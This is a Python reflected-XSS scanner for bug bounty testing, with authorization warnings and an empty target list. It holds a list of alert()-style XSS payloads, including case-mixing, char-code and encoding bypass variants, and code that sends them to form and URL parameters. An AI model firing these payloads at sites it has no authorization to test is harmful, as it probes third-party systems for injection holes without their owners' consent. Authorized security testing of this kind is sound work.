#!/usr/bin/env python3
"""
Educational XSS Scanner for Bug Bounty Testing
Author: Security Research
Purpose: Detect reflected XSS vulnerabilities in authorized targets only

DISCLAIMER: Use only on systems you own or have explicit permission to test.
Unauthorized testing is illegal and unethical.
"""

import requests
import urllib.parse
import re
from bs4 import BeautifulSoup
import time
import random
from urllib.parse import urljoin, urlparse
import json
import sys

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # XSS payloads - educational purposes
        self.payloads = [
            # Basic payloads
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            
            # Context-specific payloads
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            
            # Bypass attempts (educational)
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(&#39;XSS&#39;)">',
            '<svg><script>alert("XSS")</script></svg>',
            
            # Event handlers
            '<div onmouseover="alert(\'XSS\')">Hover me</div>',
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>',
            
            # HTML5 payloads
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video><source onerror="alert(\'XSS\')">',
            
            # Encoded payloads
            '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
            
            # Simple test markers
            'XSS_TEST_MARKER_12345',
            '<test>XSS_REFLECTION_TEST</test>'
        ]
        
        self.results = []
        
    def is_reflected(self, response_text, payload):
        """Check if payload is reflected in response"""
        # Remove URL encoding for comparison
        decoded_payload = urllib.parse.unquote(payload)
        
        # Check for direct reflection
        if payload in response_text or decoded_payload in response_text:
            return True
            
        # Check for partial reflection (useful for WAF bypass detection)
        key_parts = ['script', 'alert', 'onerror', 'onload', 'javascript']
        for part in key_parts:
            if part in payload.lower() and part in response_text.lower():
                return True
                
        return False
    
    def check_xss_protection(self, response):
        """Check for XSS protection headers"""
        headers = response.headers
        protections = []
        
        if 'X-XSS-Protection' in headers:
            protections.append(f"X-XSS-Protection: {headers['X-XSS-Protection']}")
            
        if 'Content-Security-Policy' in headers:
            protections.append(f"CSP: {headers['Content-Security-Policy'][:100]}...")
            
        if 'X-Content-Type-Options' in headers:
            protections.append(f"X-Content-Type-Options: {headers['X-Content-Type-Options']}")
            
        return protections
    
    def test_parameter(self, url, param_name, param_value, method='GET'):
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        
        print(f"\n[*] Testing parameter: {param_name}")
        
        for i, payload in enumerate(self.payloads):
            try:
                # Prepare the payload
                test_params = {param_name: payload}
                
                if method.upper() == 'GET':
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
                    response = self.session.post(url, data=test_params, timeout=10)
                
                # Check for reflection
                if self.is_reflected(response.text, payload):
                    # Check if it's actually executable (basic check)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    vulnerability = {
                        'url': response.url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'status_code': response.status_code,
                        'reflected': True,
                        'protection_headers': self.check_xss_protection(response),
                        'context': self.analyze_context(response.text, payload)
                    }
                    
                    vulnerabilities.append(vulnerability)
                    print(f"[!] POTENTIAL XSS FOUND!")
                    print(f"    URL: {response.url}")
                    print(f"    Payload: {payload}")
                    print(f"    Status: {response.status_code}")
                    
                # Rate limiting
                time.sleep(random.uniform(0.5, 1.5))
                
            except requests.exceptions.RequestException as e:
                print(f"[!] Request failed for payload {i+1}: {str(e)}")
                continue
                
        return vulnerabilities
    
    def analyze_context(self, response_text, payload):
        """Analyze the context where payload is reflected"""
        contexts = []
        
        # Check if reflected in HTML attributes
        if re.search(r'<[^>]*' + re.escape(payload) + r'[^>]*>', response_text):
            contexts.append("HTML_ATTRIBUTE")
            
        # Check if reflected in JavaScript
        if re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.DOTALL):
            contexts.append("JAVASCRIPT")
            
        # Check if reflected in HTML content
        if re.search(r'>[^<]*' + re.escape(payload) + r'[^<]*<', response_text):
            contexts.append("HTML_CONTENT")
            
        return contexts if contexts else ["UNKNOWN"]
    
    def discover_parameters(self, url):
        """Discover parameters from forms and URL"""
        parameters = {}
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find form parameters
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_elem in inputs:
                    name = input_elem.get('name')
                    if name:
                        parameters[name] = input_elem.get('value', 'test')
            
            # Parse URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                url_params = urllib.parse.parse_qs(parsed_url.query)
                for param, values in url_params.items():
                    parameters[param] = values[0] if values else 'test'
                    
        except Exception as e:
            print(f"[!] Error discovering parameters: {str(e)}")
            
        return parameters
    
    def scan_url(self, target_url):
        """Scan a single URL for XSS vulnerabilities"""
        print(f"\n[*] Scanning URL: {target_url}")
        
        # Discover parameters
        parameters = self.discover_parameters(target_url)
        
        if not parameters:
            print("[!] No parameters found to test")
            # Test with common parameter names
            common_params = ['q', 'search', 'query', 'name', 'id', 'page', 'category', 'term']
            parameters = {param: 'test' for param in common_params}
        
        print(f"[*] Found {len(parameters)} parameters to test: {list(parameters.keys())}")
        
        all_vulnerabilities = []
        
        for param_name, param_value in parameters.items():
            vulnerabilities = self.test_parameter(target_url, param_name, param_value)
            all_vulnerabilities.extend(vulnerabilities)
            
        return all_vulnerabilities
    
    def scan_multiple_urls(self, urls):
        """Scan multiple URLs"""
        all_results = []
        
        for url in urls:
            try:
                results = self.scan_url(url)
                all_results.extend(results)
            except Exception as e:
                print(f"[!] Error scanning {url}: {str(e)}")
                
        return all_results
    
    def generate_report(self, results, output_file='xss_scan_results.json'):
        """Generate detailed report"""
        report = {
            'scan_summary': {
                'total_vulnerabilities': len(results),
                'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'scanner_version': '1.0'
            },
            'vulnerabilities': results
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n[*] Report saved to: {output_file}")
        
        # Print summary
        print(f"\n=== SCAN SUMMARY ===")
        print(f"Total potential vulnerabilities found: {len(results)}")
        
        if results:
            print(f"\n=== VULNERABILITIES ===")
            for i, vuln in enumerate(results, 1):
                print(f"\n{i}. URL: {vuln['url']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Context: {', '.join(vuln['context'])}")
                print(f"   Protection Headers: {len(vuln['protection_headers'])} found")

def main():
    print("XSS Scanner - Educational Version")
    print("=" * 50)
    print("WARNING: Use only on authorized targets!")
    print("=" * 50)
    
    scanner = XSSScanner()
    
    # Example usage - replace with your authorized targets
    test_urls = [
        # Add your authorized bug bounty targets here
        # "https://example.com/search",
        # "https://target.com/profile",
    ]
    
    if not test_urls:
        print("\n[!] No URLs specified for testing.")
        print("Please add your authorized targets to the test_urls list.")
        print("Example: test_urls = ['https://your-target.com/search']")
        return
    
    # Perform scan
    results = scanner.scan_multiple_urls(test_urls)
    
    # Generate report
    scanner.generate_report(results)
    
    print("\n[*] Scan completed!")
    print("\nIMPORTANT NOTES:")
    print("- Reflection doesn't always mean exploitability")
    print("- Check for WAF protection and filtering")
    print("- Verify actual XSS execution manually")
    print("- Follow responsible disclosure practices")

if __name__ == "__main__":
    main()